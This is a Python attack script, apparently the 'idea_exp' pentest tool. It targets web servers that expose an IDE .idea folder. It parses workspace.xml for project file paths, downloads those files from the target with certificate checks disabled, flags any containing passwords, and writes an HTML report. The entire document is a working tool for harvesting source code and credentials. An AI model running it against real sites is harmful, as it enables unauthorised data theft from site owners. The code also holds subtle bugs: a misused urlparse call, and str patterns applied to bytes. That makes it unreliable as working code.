#!/usr/bin/env python
# -*- encoding: utf-8 -*-

#from __future__ import print_function
import sys
import os
import shutil
import requests
from urllib.parse import urlparse
import re
import webbrowser
from lxml import etree
from string import Template


HTML_TPL = """
<html>
<head>
<title>idea_exp scan report</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style>
    body {width:960px; margin:auto; margin-top:40px; background:rgb(240,240,240);}
    p {color: #666;}
    h2 {color:#002E8C; font-size: 1em; padding-top:5px;}
    ul li {
    # word-wrap: break-word;
    # white-space: -moz-pre-wrap;
    # white-space: pre-wrap;
    margin-bottom:10px;
    }
    span {color: red;}
    origin_link {margin-left:10px;}
</style>
</head>
<body>
<h2>${start_url}</h2>
<ul>
${url_list}
</ul>
</body>
</html>
"""


HTML_LI_TPL = """
 <li>
 ${tips} <a href="${local_file}" target="_blank">${title}${path}</a> 
 <a href="${path}" target="_blank" style="margin-left:10px;" title="origin link">-></a>
 </li>
"""


class Scanner(object):
    def __init__(self, url):
        self.start_url = url
        self.session = requests.Session()
        self.session.verify = False
        self.module_name = ''
        self.module_type = ''
        self.path_lst = []
        self.results = []
        self.get_module_name()
        self.parse_workspace()

    def get_module_name(self):
        try:
            url = self.start_url + 'modules.xml'
            text = self.session.get(url, timeout=20).text
            
            #print(text)
            if text.find('ProjectModuleManager') < 0:
                return
            root = etree.XML(text.encode('utf-8'))
            #print(root)
            module = root.find('component').find('modules').find('module')
            file_url = module.get('fileurl')
            if not file_url:
                file_url = module.get('filepath')
            self.module_name = os.path.basename(file_url)
            if self.module_name:
                print('[+] Module name is', self.module_name[:-4])
                self.get_module_type()
        except Exception as e:
            pass

    def get_module_type(self):
        try:
            url = self.start_url + self.module_name
            text = self.session.get(url, timeout=20).text
            
            root = etree.XML(text.encode('utf-8'))
            self.module_type = root.get('type').lower()
            print('[+] Type is', self.module_type)
        except Exception as e:
            pass

    def parse_workspace(self):
        try:
            url = self.start_url + 'workspace.xml'
            text = self.session.get(url, timeout=20).text
            
            if text.find('<component name="') < 0:
                print('[ERROR] Incorrect doc: workspace.xml')
                return
            root = etree.XML(text.encode('utf-8'))
            for e in root.iter():
                if e.text and e.text.strip().find('$PROJECT_DIR$') >= 0:
                    path = e.text.strip()
                    path = path[path.find('$PROJECT_DIR$')+13:]
                    if path not in self.path_lst:
                        self.path_lst.append(path)
                for key in e.attrib:
                    if e.attrib[key].find('$PROJECT_DIR$') >= 0:
                        path = e.attrib[key]
                        path = path[path.find('$PROJECT_DIR$') + 13:]
                        if path and path not in self.path_lst:
                            self.path_lst.append(path)
            if self.path_lst:
                print('[+] About %s urls to process' % len(self.path_lst))
                self.download()
            else:
                print('All done, no files found.')
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
            print('[ERROR] Fail to download %s' % url)
        except Exception as e:
            print('[ERROR] %s' % str(e))
            return

    def download(self):
        save_folder = urlparse.urlparse(self.start_url, 'http').netloc.replace(':', '_')
        if os.path.exists(save_folder):
            shutil.rmtree(save_folder)
        os.mkdir(save_folder)
        self.start_url = self.start_url[:-6].rstrip('/')
        for path in self.path_lst:
            file_name = path.lstrip('/')
            for c in r'*"/\[]:;|=,':
                file_name = file_name.replace(c, ' - ')
            r = self.session.get(self.start_url + path, stream=True)
            if r.status_code == 200:
                ret = {'tips': '', 'path': self.start_url + path, 'local_file': file_name, 'title': ''}

                out_file = None
                for chunk in r.iter_content(chunk_size=8192):
                    if not out_file:
                        out_file = open(save_folder + '/' + file_name, 'wb')
                    out_file.write(chunk)
                    m = re.search('<title>(.*?)</title>', chunk)
                    if m:
                        ret['title'] = '[%s] ' % m.group(1)
                    if chunk.lower().find('passw') > 0:
                        ret['tips'] = '<span><b>(Contain Password)</b></span>'
                if out_file:
                    out_file.close()
                    self.results.append(ret)
            print('[%s] %s' % (r.status_code, path))

        if self.results:
            tpl_html = Template(HTML_TPL)
            tpl_li = Template(HTML_LI_TPL)
            str_li = ''
            for r in self.results:
                str_li += tpl_li.substitute(r)
            with open(save_folder + '/idea_exp_report.html', 'wb') as f:
                f.write(tpl_html.substitute({'start_url': self.start_url, 'url_list': str_li}))
            print('All files saved to ' + save_folder + '/idea_exp_report.html')
            webbrowser.open_new_tab(os.path.abspath(save_folder + '/idea_exp_report.html'))

print('Usage: python idea_exp.py http://example.com/.idea/')

def check(**kwargs):
    url = kwargs['url']
    if not url.lower().startswith('http'):
        url = 'http://' + url
    if url.rfind('.idea') > 0:
        url = url[:url.rfind('.idea')] + '.idea/'
    else:
        url = url.rstrip('/') + '/.idea/'
    s = Scanner(url)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("""idea_exp v1.0 (https://github.com/lijiejie/idea_exploit)
        
Gather sensitive information from (.idea) folder for pentesters. Usage:
  
python idea_exp.py http://example.com/.idea/
  """)
        exit(0)
    url = sys.argv[1]
    if not url.lower().startswith('http'):
        url = 'http://' + url
    if url.rfind('.idea') > 0:
        url = url[:url.rfind('.idea')] + '.idea/'
    else:
        url = url.rstrip('/') + '/.idea/'

    s = Scanner(url)
